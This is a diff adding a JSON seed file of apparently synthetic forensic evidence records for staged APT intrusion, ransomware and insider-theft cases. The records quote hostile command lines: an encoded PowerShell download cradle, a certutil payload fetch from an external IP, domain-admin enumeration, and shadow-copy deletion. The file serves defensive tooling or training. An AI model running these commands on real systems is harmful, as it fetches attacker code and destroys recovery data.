@@ -1,0 +1,1162 @@
+[
+  {
+    "_id": "6ae57fe90b4f9924538a1759",
+    "investigationId": "CASE-2026-APT29",
+    "caseId": "CASE-2026-APT29",
+    "timestamp": "2026-10-10T08:14:22.000Z",
+    "eventTimestamp": "2026-10-10T08:14:22.000Z",
+    "ingestionTimestamp": "2026-10-31T05:43:05.916Z",
+    "artifactType": "SECURITY_EVENT",
+    "evidenceType": "SECURITY_EVENT",
+    "severity": "HIGH",
+    "sourceHost": "idp-sso.cloud.globalcorp.com",
+    "title": "OAuth Device Code Authorization Granted",
+    "description": "User sarah.chen initiated OAuth 2.0 device code authorization flow from Tokyo geolocation.",
+    "mitreTactic": "Initial Access",
+    "mitreTechnique": "T1566.002 - Spearphishing Link",
+    "metadata": {
+      "user": "sarah.chen@globalcorp.com",
+      "sourceIp": "203.0.113.88",
+      "geoCountry": "Japan",
+      "geoCity": "Tokyo",
+      "authProtocol": "OAuth2_DeviceCode",
+      "clientId": "d3b07384-d113-494a-9c73-201a6f028b1b",
+      "appDisplayName": "Office365 Service Manager"
+    },
+    "entities": [
+      {
+        "type": "HOST",
+        "value": "idp-sso.cloud.globalcorp.com"
+      },
+      {
+        "type": "IP",
+        "value": "203.0.113.88"
+      },
+      {
+        "type": "USER",
+        "value": "sarah.chen@globalcorp.com"
+      }
+    ],
+    "version": 1,
+    "evidenceId": "EV-APT29-001",
+    "currentHash": "c90d1e5d7536029ff43d1ff6d7e2589d3166da5f4d4ee2d7dd505773e45a88c4",
+    "sha256": "c90d1e5d7536029ff43d1ff6d7e2589d3166da5f4d4ee2d7dd505773e45a88c4",
+    "tags": [],
+    "gridfsFileId": "6ae57fe90b4f9924538a1755",
+    "integrityStatus": "VERIFIED",
+    "provenance": {
+      "source": "API_INGEST",
+      "ingestedBy": "Seed-Loader"
+    },
+    "createdBy": "Seed-Loader",
+    "createdAt": "2026-10-31T05:43:05.916Z",
+    "updatedAt": "2026-10-31T05:43:05.916Z"
+  },
+  {
+    "_id": "6ae57fe90b4f9924538a175d",
+    "investigationId": "CASE-2026-APT29",
+    "caseId": "CASE-2026-APT29",
+    "timestamp": "2026-10-10T08:18:05.000Z",
+    "eventTimestamp": "2026-10-10T08:18:05.000Z",
+    "ingestionTimestamp": "2026-10-31T05:43:05.931Z",
+    "artifactType": "SECURITY_EVENT",
+    "evidenceType": "SECURITY_EVENT",
+    "severity": "CRITICAL",
+    "sourceHost": "graph-api.cloud.globalcorp.com",
+    "title": "Microsoft Graph API Session Initialized",
+    "description": "PowerShell script execution flagged by CrowdStrike Falcon EDR. Refined forensic analysis confirmed Obfuscated AMSI Bypass string in command line payload.",
+    "mitreTactic": "Initial Access",
+    "mitreTechnique": "T1078 - Valid Accounts",
+    "metadata": {
+      "user": "sarah.chen@globalcorp.com",
+      "sourceIp": "198.51.100.42",
+      "geoCountry": "Germany",
+      "geoCity": "Frankfurt",
+      "apiCall": "GET /v1.0/users/delta",
+      "userAgent": "python-requests/2.31.0",
+      "analystNotes": "Threat intelligence confirmed hash matches CozyBear payload bundle.",
+      "iocEnriched": true
+    },
+    "entities": [
+      {
+        "type": "HOST",
+        "value": "graph-api.cloud.globalcorp.com"
+      },
+      {
+        "type": "IP",
+        "value": "198.51.100.42"
+      },
+      {
+        "type": "USER",
+        "value": "sarah.chen@globalcorp.com"
+      },
+      {
+        "type": "HASH",
+        "value": "714bee0e19caa077f03c0726b6f3655e957cd4562bd659e8f2d61b48fa104fab"
+      }
+    ],
+    "version": 2,
+    "evidenceId": "EV-APT29-002",
+    "currentHash": "c00fc133ab244c48a4330f47a12139b8cd232b83772516fec7be963d4cc6437a",
+    "sha256": "714bee0e19caa077f03c0726b6f3655e957cd4562bd659e8f2d61b48fa104fab",
+    "tags": [],
+    "gridfsFileId": null,
+    "integrityStatus": "VERIFIED",
+    "provenance": {
+      "source": "API_INGEST",
+      "ingestedBy": "Seed-Loader"
+    },
+    "createdBy": "Seed-Loader",
+    "createdAt": "2026-10-31T05:43:05.931Z",
+    "updatedAt": "2026-10-31T05:43:06.088Z"
+  },
+  {
+    "_id": "6ae57fe90b4f9924538a1761",
+    "investigationId": "CASE-2026-APT29",
+    "caseId": "CASE-2026-APT29",
+    "timestamp": "2026-10-10T08:35:10.000Z",
+    "eventTimestamp": "2026-10-10T08:35:10.000Z",
+    "ingestionTimestamp": "2026-10-31T05:43:05.941Z",
+    "artifactType": "PROCESS_SPAWN",
+    "evidenceType": "PROCESS_SPAWN",
+    "severity": "CRITICAL",
+    "sourceHost": "ws-dev-04.corp.lan",
+    "title": "Obfuscated PowerShell In-Memory Execution",
+    "description": "PowerShell spawned with base64 encoded payload under parent PID 4812 (missing parent log).",
+    "mitreTactic": "Execution",
+    "mitreTechnique": "T1059.001 - PowerShell",
+    "metadata": {
+      "processId": 5920,
+      "parentProcessId": 4812,
+      "parentProcessName": "unmonitored_launcher.exe",
+      "processName": "powershell.exe",
+      "commandLine": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiaAB0AHQAcAA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA1AC8AcAAiACkA",
+      "user": "sarah.chen",
+      "sha256": "73573c2356c9a75d5e23be2a9b2b2a6f112c018287e07a3c75ab9d2666a4bc4a"
+    },
+    "entities": [
+      {
+        "type": "HOST",
+        "value": "ws-dev-04.corp.lan"
+      },
+      {
+        "type": "USER",
+        "value": "sarah.chen"
+      },
+      {
+        "type": "PROCESS",
+        "value": "powershell.exe"
+      },
+      {
+        "type": "PROCESS",
+        "value": "unmonitored_launcher.exe"
+      },
+      {
+        "type": "HASH",
+        "value": "73573c2356c9a75d5e23be2a9b2b2a6f112c018287e07a3c75ab9d2666a4bc4a"
+      }
+    ],
+    "version": 1,
+    "evidenceId": "EV-APT29-003",
+    "currentHash": "2ad0cb342d7389d71bcfd65abdd2bd2b0ee24b71b432c92c749c1a215457e30e",
+    "sha256": "73573c2356c9a75d5e23be2a9b2b2a6f112c018287e07a3c75ab9d2666a4bc4a",
+    "tags": [],
+    "gridfsFileId": "6ae57fe90b4f9924538a1757",
+    "integrityStatus": "VERIFIED",
+    "provenance": {
+      "source": "API_INGEST",
+      "ingestedBy": "Seed-Loader"
+    },
+    "createdBy": "Seed-Loader",
+    "createdAt": "2026-10-31T05:43:05.941Z",
+    "updatedAt": "2026-10-31T05:43:05.941Z"
+  },
+  {
+    "_id": "6ae57fe90b4f9924538a1765",
+    "investigationId": "CASE-2026-APT29",
+    "caseId": "CASE-2026-APT29",
+    "timestamp": "2026-10-10T08:36:00.000Z",
+    "eventTimestamp": "2026-10-10T08:36:00.000Z",
+    "ingestionTimestamp": "2026-10-31T05:43:05.957Z",
+    "artifactType": "FILE_INTEGRITY",
+    "evidenceType": "FILE_INTEGRITY",
+    "severity": "HIGH",
+    "sourceHost": "edge-proxy-01.corp.lan",
+    "title": "Gateway Inspection: Encrypted Payload Staged",
+    "description": "Perimeter proxy inspected download of core payload helper module `system_update.dll`.",
+    "mitreTactic": "Defense Evasion",
+    "mitreTechnique": "T1027 - Obfuscated Files",
+    "metadata": {
+      "fileName": "system_update.dll",
+      "filePath": "C:\\Windows\\Temp\\system_update.dll",
+      "sha256": "a1b2c3d4e5f60718293a4b5c6d7e8f901234567890abcdef1234567890abcdef",
+      "observedAt": "Perimeter-Gateway",
+      "fileSizeBytes": 204850
+    },
+    "entities": [
+      {
+        "type": "HOST",
+        "value": "edge-proxy-01.corp.lan"
+      },
+      {
+        "type": "FILE",
+        "value": "system_update.dll"
+      },
+      {
+        "type": "HASH",
+        "value": "a1b2c3d4e5f60718293a4b5c6d7e8f901234567890abcdef1234567890abcdef"
+      }
+    ],
+    "version": 1,
+    "evidenceId": "EV-APT29-004",
+    "currentHash": "b5c69051bc4095f5bb40c53a6d61a02db19a031c6b6ae7a233d23d1404d10cec",
+    "sha256": "a1b2c3d4e5f60718293a4b5c6d7e8f901234567890abcdef1234567890abcdef",
+    "tags": [],
+    "gridfsFileId": null,
+    "integrityStatus": "VERIFIED",
+    "provenance": {
+      "source": "API_INGEST",
+      "ingestedBy": "Seed-Loader"
+    },
+    "createdBy": "Seed-Loader",
+    "createdAt": "2026-10-31T05:43:05.957Z",
+    "updatedAt": "2026-10-31T05:43:05.957Z"
+  },
+  {
+    "_id": "6ae57fe90b4f9924538a1769",
+    "investigationId": "CASE-2026-APT29",
+    "caseId": "CASE-2026-APT29",
+    "timestamp": "2026-10-10T08:36:12.000Z",
+    "eventTimestamp": "2026-10-10T08:36:12.000Z",
+    "ingestionTimestamp": "2026-10-31T05:43:05.966Z",
+    "artifactType": "FILE_INTEGRITY",
+    "evidenceType": "FILE_INTEGRITY",
+    "severity": "HIGH",
+    "sourceHost": "ws-dev-04.corp.lan",
+    "title": "Endpoint EDR: Module Injected to System Directory",
+    "description": "Endpoint file creation of `system_update.dll` with differing checksum (HASH CONFLICT).",
+    "mitreTactic": "Defense Evasion",
+    "mitreTechnique": "T1036 - Masquerading",
+    "metadata": {
+      "fileName": "system_update.dll",
+      "filePath": "C:\\Windows\\Temp\\system_update.dll",
+      "sha256": "f9e8d7c6b5a403211234567890abcdef9876543210fedcba0987654321fedcba",
+      "observedAt": "Endpoint-EDR",
+      "fileSizeBytes": 219136
+    },
+    "entities": [
+      {
+        "type": "HOST",
+        "value": "ws-dev-04.corp.lan"
+      },
+      {
+        "type": "FILE",
+        "value": "system_update.dll"
+      },
+      {
+        "type": "HASH",
+        "value": "f9e8d7c6b5a403211234567890abcdef9876543210fedcba0987654321fedcba"
+      }
+    ],
+    "version": 1,
+    "evidenceId": "EV-APT29-005",
+    "currentHash": "c46b619db9dcf85ef6c3c289f97fdceeb346289882edaa4ede4d7c9f7a8fec3b",
+    "sha256": "f9e8d7c6b5a403211234567890abcdef9876543210fedcba0987654321fedcba",
+    "tags": [],
+    "gridfsFileId": null,
+    "integrityStatus": "VERIFIED",
+    "provenance": {
+      "source": "API_INGEST",
+      "ingestedBy": "Seed-Loader"
+    },
+    "createdBy": "Seed-Loader",
+    "createdAt": "2026-10-31T05:43:05.966Z",
+    "updatedAt": "2026-10-31T05:43:05.966Z"
+  },
+  {
+    "_id": "6ae57fe90b4f9924538a176d",
+    "investigationId": "CASE-2026-APT29",
+    "caseId": "CASE-2026-APT29",
+    "timestamp": "2026-10-10T08:42:00.000Z",
+    "eventTimestamp": "2026-10-10T08:42:00.000Z",
+    "ingestionTimestamp": "2026-10-31T05:43:05.974Z",
+    "artifactType": "PROCESS_SPAWN",
+    "evidenceType": "PROCESS_SPAWN",
+    "severity": "CRITICAL",
+    "sourceHost": "ws-dev-04.corp.lan",
+    "title": "Dual-Use Binary Living-off-the-Land Invocation",
+    "description": "Native utility certutil invoked to download secondary payload.",
+    "mitreTactic": "Defense Evasion",
+    "mitreTechnique": "T1105 - Ingress Tool Transfer",
+    "metadata": {
+      "processName": "certutil.exe",
+      "commandLine": "certutil.exe -urlcache -split -f http://185.220.101.5/beacon.bin C:\\Windows\\Temp\\beacon.bin",
+      "processId": 6112,
+      "user": "sarah.chen"
+    },
+    "entities": [
+      {
+        "type": "HOST",
+        "value": "ws-dev-04.corp.lan"
+      },
+      {
+        "type": "USER",
+        "value": "sarah.chen"
+      },
+      {
+        "type": "PROCESS",
+        "value": "certutil.exe"
+      }
+    ],
+    "version": 1,
+    "evidenceId": "EV-APT29-006",
+    "currentHash": "439246fac7940aadf82c2f3e4baf57dca012764cdc5ba9e3a9500760109760da",
+    "sha256": "439246fac7940aadf82c2f3e4baf57dca012764cdc5ba9e3a9500760109760da",
+    "tags": [],
+    "gridfsFileId": null,
+    "integrityStatus": "VERIFIED",
+    "provenance": {
+      "source": "API_INGEST",
+      "ingestedBy": "Seed-Loader"
+    },
+    "createdBy": "Seed-Loader",
+    "createdAt": "2026-10-31T05:43:05.974Z",
+    "updatedAt": "2026-10-31T05:43:05.974Z"
+  },
+  {
+    "_id": "6ae57fe90b4f9924538a1771",
+    "investigationId": "CASE-2026-APT29",
+    "caseId": "CASE-2026-APT29",
+    "timestamp": "2026-10-10T08:44:30.000Z",
+    "eventTimestamp": "2026-10-10T08:44:30.000Z",
+    "ingestionTimestamp": "2026-10-31T05:43:05.983Z",
+    "artifactType": "PROCESS_SPAWN",
+    "evidenceType": "PROCESS_SPAWN",
+    "severity": "CRITICAL",
+    "sourceHost": "ws-dev-04.corp.lan",
+    "title": "WMI Query for Remote Domain Controller Discovery",
+    "description": "WMIC invoked to query Active Directory domain trust topology.",
+    "mitreTactic": "Discovery",
+    "mitreTechnique": "T1047 - Windows Management Instrumentation",
+    "metadata": {
+      "processName": "wmic.exe",
+      "commandLine": "wmic.exe /node:localhost process call create \"cmd.exe /c net group \"Domain Admins\" /domain\"",
+      "processId": 6204,
+      "user": "sarah.chen"
+    },
+    "entities": [
+      {
+        "type": "HOST",
+        "value": "ws-dev-04.corp.lan"
+      },
+      {
+        "type": "USER",
+        "value": "sarah.chen"
+      },
+      {
+        "type": "PROCESS",
+        "value": "wmic.exe"
+      }
+    ],
+    "version": 1,
+    "evidenceId": "EV-APT29-007",
+    "currentHash": "2ea598fbefba6d39ba7988be1e505e4fac077ac6cebcf8e2e49e9ec0f48ec2a4",
+    "sha256": "2ea598fbefba6d39ba7988be1e505e4fac077ac6cebcf8e2e49e9ec0f48ec2a4",
+    "tags": [],
+    "gridfsFileId": null,
+    "integrityStatus": "VERIFIED",
+    "provenance": {
+      "source": "API_INGEST",
+      "ingestedBy": "Seed-Loader"
+    },
+    "createdBy": "Seed-Loader",
+    "createdAt": "2026-10-31T05:43:05.983Z",
+    "updatedAt": "2026-10-31T05:43:05.983Z"
+  },
+  {
+    "_id": "6ae57fe90b4f9924538a1775",
+    "investigationId": "CASE-2026-APT29",
+    "caseId": "CASE-2026-APT29",
+    "timestamp": "2026-10-10T08:52:10.000Z",
+    "eventTimestamp": "2026-10-10T08:52:10.000Z",
+    "ingestionTimestamp": "2026-10-31T05:43:05.990Z",
+    "artifactType": "NETWORK_FLOW",
+    "evidenceType": "NETWORK_FLOW",
+    "severity": "CRITICAL",
+    "sourceHost": "ws-dev-04.corp.lan",
+    "title": "Lateral SMB Session Initiated to Primary Domain Controller",
+    "description": "Workstation ws-dev-04 opened SMB connection on port 445 to dc01.corp.lan without logged auth on DC01.",
+    "mitreTactic": "Lateral Movement",
+    "mitreTechnique": "T1021.002 - SMB/Windows Admin Shares",
+    "metadata": {
+      "sourceIp": "10.0.1.14",
+      "destinationIp": "10.0.0.2",
+      "targetHost": "dc01.corp.lan",
+      "destinationPort": 445,
+      "protocol": "SMB2",
+      "bytesOut": 184500,
+      "user": "DOMAIN\\sarah.chen"
+    },
+    "entities": [
+      {
+        "type": "HOST",
+        "value": "ws-dev-04.corp.lan"
+      },
+      {
+        "type": "IP",
+        "value": "10.0.1.14"
+      },
+      {
+        "type": "IP",
+        "value": "10.0.0.2"
+      },
+      {
+        "type": "USER",
+        "value": "domain\\sarah.chen"
+      }
+    ],
+    "version": 1,
+    "evidenceId": "EV-APT29-008",
+    "currentHash": "820a12b50f937ab4294989d0f6f934e00280d41a32f4bac7584d498acaf58052",
+    "sha256": "820a12b50f937ab4294989d0f6f934e00280d41a32f4bac7584d498acaf58052",
+    "tags": [],
+    "gridfsFileId": null,
+    "integrityStatus": "VERIFIED",
+    "provenance": {
+      "source": "API_INGEST",
+      "ingestedBy": "Seed-Loader"
+    },
+    "createdBy": "Seed-Loader",
+    "createdAt": "2026-10-31T05:43:05.990Z",
+    "updatedAt": "2026-10-31T05:43:05.990Z"
+  },
+  {
+    "_id": "6ae57fea0b4f9924538a1779",
+    "investigationId": "CASE-2026-APT29",
+    "caseId": "CASE-2026-APT29",
+    "timestamp": "2026-10-10T09:15:00.000Z",
+    "eventTimestamp": "2026-10-10T09:15:00.000Z",
+    "ingestionTimestamp": "2026-10-31T05:43:06.002Z",
+    "artifactType": "NETWORK_FLOW",
+    "evidenceType": "NETWORK_FLOW",
+    "severity": "CRITICAL",
+    "sourceHost": "ws-dev-04.corp.lan",
+    "title": "Sustained TLS Beaconing to External Command & Control",
+    "description": "Recurring encrypted C2 beaconing on port 443 with jitter to adversary infrastructure.",
+    "mitreTactic": "Command and Control",
+    "mitreTechnique": "T1071.001 - Web Protocols",
+    "metadata": {
+      "remoteIp": "185.220.101.5",
+      "domain": "azure-telemetry-cdn.net",
+      "destinationPort": 443,
+      "protocol": "TLSv1.3",
+      "bytesTransferred": 48920110,
+      "beaconIntervalSec": 60
+    },
+    "entities": [
+      {
+        "type": "HOST",
+        "value": "ws-dev-04.corp.lan"
+      },
+      {
+        "type": "IP",
+        "value": "185.220.101.5"
+      },
+      {
+        "type": "DOMAIN",
+        "value": "azure-telemetry-cdn.net"
+      }
+    ],
+    "version": 1,
+    "evidenceId": "EV-APT29-009",
+    "currentHash": "00c7f6a193f1be415ec634c2bcff3f3d4a5cb65a7fd2f9e085c2148798647621",
+    "sha256": "00c7f6a193f1be415ec634c2bcff3f3d4a5cb65a7fd2f9e085c2148798647621",
+    "tags": [],
+    "gridfsFileId": null,
+    "integrityStatus": "VERIFIED",
+    "provenance": {
+      "source": "API_INGEST",
+      "ingestedBy": "Seed-Loader"
+    },
+    "createdBy": "Seed-Loader",
+    "createdAt": "2026-10-31T05:43:06.002Z",
+    "updatedAt": "2026-10-31T05:43:06.002Z"
+  },
+  {
+    "_id": "6ae57fea0b4f9924538a177d",
+    "investigationId": "CASE-2026-APT29",
+    "caseId": "CASE-2026-APT29",
+    "timestamp": "2026-10-10T09:40:00.000Z",
+    "eventTimestamp": "2026-10-10T09:40:00.000Z",
+    "ingestionTimestamp": "2026-10-31T05:43:06.011Z",
+    "artifactType": "APPLICATION_LOG",
+    "evidenceType": "APPLICATION_LOG",
+    "severity": "CRITICAL",
+    "sourceHost": "ws-dev-04.corp.lan",
+    "title": "Bulk Archive Compression and Exfiltration Transfer",
+    "description": "Encrypted 7z archive uploaded to external cloud storage endpoint.",
+    "mitreTactic": "Exfiltration",
+    "mitreTechnique": "T1560 - Archive Collected Data",
+    "metadata": {
+      "filePath": "C:\\Users\\sarah.chen\\AppData\\Local\\Temp\\intel_dump.7z",
+      "remoteIp": "185.220.101.5",
+      "bytesTransferred": 94827100,
+      "sha256": "45b98a12e32a4e98f01b7a2d6c9e0f3148a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3"
+    },
+    "entities": [
+      {
+        "type": "HOST",
+        "value": "ws-dev-04.corp.lan"
+      },
+      {
+        "type": "IP",
+        "value": "185.220.101.5"
+      },
+      {
+        "type": "FILE",
+        "value": "C:\\Users\\sarah.chen\\AppData\\Local\\Temp\\intel_dump.7z"
+      },
+      {
+        "type": "HASH",
+        "value": "45b98a12e32a4e98f01b7a2d6c9e0f3148a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3"
+      }
+    ],
+    "version": 1,
+    "evidenceId": "EV-APT29-010",
+    "currentHash": "cda7dec0c126d59f9b417e603811dfc3a17791d4ff153d7df9eb9308d5beac45",
+    "sha256": "45b98a12e32a4e98f01b7a2d6c9e0f3148a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3",
+    "tags": [],
+    "gridfsFileId": null,
+    "integrityStatus": "VERIFIED",
+    "provenance": {
+      "source": "API_INGEST",
+      "ingestedBy": "Seed-Loader"
+    },
+    "createdBy": "Seed-Loader",
+    "createdAt": "2026-10-31T05:43:06.011Z",
+    "updatedAt": "2026-10-31T05:43:06.011Z"
+  },
+  {
+    "_id": "6ae57fea0b4f9924538a1781",
+    "investigationId": "CASE-2026-BLACKCAT",
+    "caseId": "CASE-2026-BLACKCAT",
+    "timestamp": "2026-10-11T14:32:00.000Z",
+    "eventTimestamp": "2026-10-11T14:32:00.000Z",
+    "ingestionTimestamp": "2026-10-31T05:43:06.033Z",
+    "artifactType": "SECURITY_EVENT",
+    "evidenceType": "SECURITY_EVENT",
+    "severity": "HIGH",
+    "sourceHost": "vpn-gw-01.corp.lan",
+    "title": "VPN Service Brute-Force Authentication Spike",
+    "description": "Over 2,400 authentication attempts against service account `svc_backup` from external IP.",
+    "mitreTactic": "Initial Access",
+    "mitreTechnique": "T1110 - Brute Force",
+    "metadata": {
+      "sourceIp": "185.191.171.12",
+      "user": "svc_backup",
+      "attemptCount": 2450
+    },
+    "entities": [
+      {
+        "type": "HOST",
+        "value": "vpn-gw-01.corp.lan"
+      },
+      {
+        "type": "IP",
+        "value": "185.191.171.12"
+      },
+      {
+        "type": "USER",
+        "value": "svc_backup"
+      }
+    ],
+    "version": 1,
+    "evidenceId": "EV-BC-001",
+    "currentHash": "c003389eea7a576486b66310e362512611ef14771c8769ab3309188f89f98122",
+    "sha256": "c003389eea7a576486b66310e362512611ef14771c8769ab3309188f89f98122",
+    "tags": [],
+    "gridfsFileId": null,
+    "integrityStatus": "VERIFIED",
+    "provenance": {
+      "source": "API_INGEST",
+      "ingestedBy": "Seed-Loader"
+    },
+    "createdBy": "Seed-Loader",
+    "createdAt": "2026-10-31T05:43:06.033Z",
+    "updatedAt": "2026-10-31T05:43:06.033Z"
+  },
+  {
+    "_id": "6ae57fea0b4f9924538a1785",
+    "investigationId": "CASE-2026-BLACKCAT",
+    "caseId": "CASE-2026-BLACKCAT",
+    "timestamp": "2026-10-11T14:45:10.000Z",
+    "eventTimestamp": "2026-10-11T14:45:10.000Z",
+    "ingestionTimestamp": "2026-10-31T05:43:06.039Z",
+    "artifactType": "PROCESS_SPAWN",
+    "evidenceType": "PROCESS_SPAWN",
+    "severity": "CRITICAL",
+    "sourceHost": "fs01.corp.lan",
+    "title": "Inhibit System Recovery: Shadow Copies Wiped",
+    "description": "Vssadmin invoked to purge volume shadow copies and disable boot recovery.",
+    "mitreTactic": "Impact",
+    "mitreTechnique": "T1490 - Inhibit System Recovery",
+    "metadata": {
+      "commandLine": "vssadmin delete shadows /all /quiet && bcdedit /set {default} bootstatuspolicy ignoreallfailures",
+      "processName": "vssadmin.exe",
+      "user": "NT AUTHORITY\\SYSTEM"
+    },
+    "entities": [
+      {
+        "type": "HOST",
+        "value": "fs01.corp.lan"
+      },
+      {
+        "type": "USER",
+        "value": "nt authority\\system"
+      },
+      {
+        "type": "PROCESS",
+        "value": "vssadmin.exe"
+      }
+    ],
+    "version": 1,
+    "evidenceId": "EV-BC-002",
+    "currentHash": "142b986f51050bdcdec341f5ed573551f6f21c33f3b22d310426c5ee9f3dbd0c",
+    "sha256": "142b986f51050bdcdec341f5ed573551f6f21c33f3b22d310426c5ee9f3dbd0c",
+    "tags": [],
+    "gridfsFileId": null,
+    "integrityStatus": "VERIFIED",
+    "provenance": {
+      "source": "API_INGEST",
+      "ingestedBy": "Seed-Loader"
+    },
+    "createdBy": "Seed-Loader",
+    "createdAt": "2026-10-31T05:43:06.039Z",
+    "updatedAt": "2026-10-31T05:43:06.039Z"
+  },
+  {
+    "_id": "6ae57fea0b4f9924538a1789",
+    "investigationId": "CASE-2026-BLACKCAT",
+    "caseId": "CASE-2026-BLACKCAT",
+    "timestamp": "2026-10-11T14:46:00.000Z",
+    "eventTimestamp": "2026-10-11T14:46:00.000Z",
+    "ingestionTimestamp": "2026-10-31T05:43:06.045Z",
+    "artifactType": "FILE_INTEGRITY",
+    "evidenceType": "FILE_INTEGRITY",
+    "severity": "CRITICAL",
+    "sourceHost": "fs01.corp.lan",
+    "title": "Mass File Encryption Burst - Batch 1",
+    "description": "10 files renamed with `.alphalocker` extension in directory C:\\Shares\\Finance.",
+    "mitreTactic": "Impact",
+    "mitreTechnique": "T1486 - Data Encrypted for Impact",
+    "metadata": {
+      "action": "FILE_MODIFIED",
+      "batchSize": 10,
+      "directory": "C:\\Shares\\Finance",
+      "compileTime": "2026-10-11T16:00:00.000Z"
+    },
+    "entities": [
+      {
+        "type": "HOST",
+        "value": "fs01.corp.lan"
+      }
+    ],
+    "version": 1,
+    "evidenceId": "EV-BC-003",
+    "currentHash": "f0394ace8502304f0bace91934909d4b83b6e40f8d446e5aa3cd1f55d53873f3",
+    "sha256": "f0394ace8502304f0bace91934909d4b83b6e40f8d446e5aa3cd1f55d53873f3",
+    "tags": [],
+    "gridfsFileId": null,
+    "integrityStatus": "VERIFIED",
+    "provenance": {
+      "source": "API_INGEST",
+      "ingestedBy": "Seed-Loader"
+    },
+    "createdBy": "Seed-Loader",
+    "createdAt": "2026-10-31T05:43:06.045Z",
+    "updatedAt": "2026-10-31T05:43:06.045Z"
+  },
+  {
+    "_id": "6ae57fea0b4f9924538a178d",
+    "investigationId": "CASE-2026-BLACKCAT",
+    "caseId": "CASE-2026-BLACKCAT",
+    "timestamp": "2026-10-11T14:46:15.000Z",
+    "eventTimestamp": "2026-10-11T14:46:15.000Z",
+    "ingestionTimestamp": "2026-10-31T05:43:06.049Z",
+    "artifactType": "FILE_INTEGRITY",
+    "evidenceType": "FILE_INTEGRITY",
+    "severity": "CRITICAL",
+    "sourceHost": "fs01.corp.lan",
+    "title": "Mass File Encryption Burst - Batch 2",
+    "description": "15 files renamed with `.alphalocker` extension in directory C:\\Shares\\HR.",
+    "mitreTactic": "Impact",
+    "mitreTechnique": "T1486 - Data Encrypted for Impact",
+    "metadata": {
+      "action": "FILE_MODIFIED",
+      "batchSize": 15,
+      "directory": "C:\\Shares\\HR"
+    },
+    "entities": [
+      {
+        "type": "HOST",
+        "value": "fs01.corp.lan"
+      }
+    ],
+    "version": 1,
+    "evidenceId": "EV-BC-004",
+    "currentHash": "fb4261c4e44ac0f91ae39228b7e069efd5dd516fed989c99b15233c8d34635da",
+    "sha256": "fb4261c4e44ac0f91ae39228b7e069efd5dd516fed989c99b15233c8d34635da",
+    "tags": [],
+    "gridfsFileId": null,
+    "integrityStatus": "VERIFIED",
+    "provenance": {
+      "source": "API_INGEST",
+      "ingestedBy": "Seed-Loader"
+    },
+    "createdBy": "Seed-Loader",
+    "createdAt": "2026-10-31T05:43:06.049Z",
+    "updatedAt": "2026-10-31T05:43:06.049Z"
+  },
+  {
+    "_id": "6ae57fea0b4f9924538a1791",
+    "investigationId": "CASE-2026-INSIDER",
+    "caseId": "CASE-2026-INSIDER",
+    "timestamp": "2026-10-12T22:15:00.000Z",
+    "eventTimestamp": "2026-10-12T22:15:00.000Z",
+    "ingestionTimestamp": "2026-10-31T05:43:06.058Z",
+    "artifactType": "SECURITY_EVENT",
+    "evidenceType": "SECURITY_EVENT",
+    "severity": "HIGH",
+    "sourceHost": "vpn-core-uswest.corp.lan",
+    "title": "Off-Hours Anomalous VPN Authentication",
+    "description": "Senior engineer marcus.vance authenticated from residential IP outside normal working window.",
+    "mitreTactic": "Initial Access",
+    "mitreTechnique": "T1078 - Valid Accounts",
+    "metadata": {
+      "sourceIp": "73.189.44.120",
+      "user": "marcus.vance",
+      "geoCountry": "US",
+      "geoCity": "San Jose"
+    },
+    "entities": [
+      {
+        "type": "HOST",
+        "value": "vpn-core-uswest.corp.lan"
+      },
+      {
+        "type": "IP",
+        "value": "73.189.44.120"
+      },
+      {
+        "type": "USER",
+        "value": "marcus.vance"
+      }
+    ],
+    "version": 1,
+    "evidenceId": "EV-INS-001",
+    "currentHash": "e33f5cd5d6a9b3f0e8299cc0730e76f52011766cb4f248872811e86f7a825afd",
+    "sha256": "e33f5cd5d6a9b3f0e8299cc0730e76f52011766cb4f248872811e86f7a825afd",
+    "tags": [],
+    "gridfsFileId": null,
+    "integrityStatus": "VERIFIED",
+    "provenance": {
+      "source": "API_INGEST",
+      "ingestedBy": "Seed-Loader"
+    },
+    "createdBy": "Seed-Loader",
+    "createdAt": "2026-10-31T05:43:06.058Z",
+    "updatedAt": "2026-10-31T05:43:06.058Z"
+  },
+  {
+    "_id": "6ae57fea0b4f9924538a1795",
+    "investigationId": "CASE-2026-INSIDER",
+    "caseId": "CASE-2026-INSIDER",
+    "timestamp": "2026-10-12T22:34:10.000Z",
+    "eventTimestamp": "2026-10-12T22:34:10.000Z",
+    "ingestionTimestamp": "2026-10-31T05:43:06.066Z",
+    "artifactType": "APPLICATION_LOG",
+    "evidenceType": "APPLICATION_LOG",
+    "severity": "HIGH",
+    "sourceHost": "git-core.corp.lan",
+    "title": "Mass Archive Clone of Autonomous Driving Patents",
+    "description": "Sequential clone of 18 restricted repositories containing patent algorithms.",
+    "mitreTactic": "Collection",
+    "mitreTechnique": "T1213 - Data from Information Repositories",
+    "metadata": {
+      "repoName": "autonomous-kernel/decision-tree-v4",
+      "user": "marcus.vance",
+      "bytesTransferred": 524288000
+    },
+    "entities": [
+      {
+        "type": "HOST",
+        "value": "git-core.corp.lan"
+      },
+      {
+        "type": "USER",
+        "value": "marcus.vance"
+      }
+    ],
+    "version": 1,
+    "evidenceId": "EV-INS-002",
+    "currentHash": "fddcab8a5eff17380bd6ca657fe6b2a95c9fb5278c1b5d856ca654e6cb9ce57b",
+    "sha256": "fddcab8a5eff17380bd6ca657fe6b2a95c9fb5278c1b5d856ca654e6cb9ce57b",
+    "tags": [],
+    "gridfsFileId": null,
+    "integrityStatus": "VERIFIED",
+    "provenance": {
+      "source": "API_INGEST",
+      "ingestedBy": "Seed-Loader"
+    },
+    "createdBy": "Seed-Loader",
+    "createdAt": "2026-10-31T05:43:06.066Z",
+    "updatedAt": "2026-10-31T05:43:06.066Z"
+  },
+  {
+    "_id": "6ae57fea0b4f9924538a1799",
+    "investigationId": "CASE-2026-INSIDER",
+    "caseId": "CASE-2026-INSIDER",
+    "timestamp": "2026-10-12T23:05:00.000Z",
+    "eventTimestamp": "2026-10-12T23:05:00.000Z",
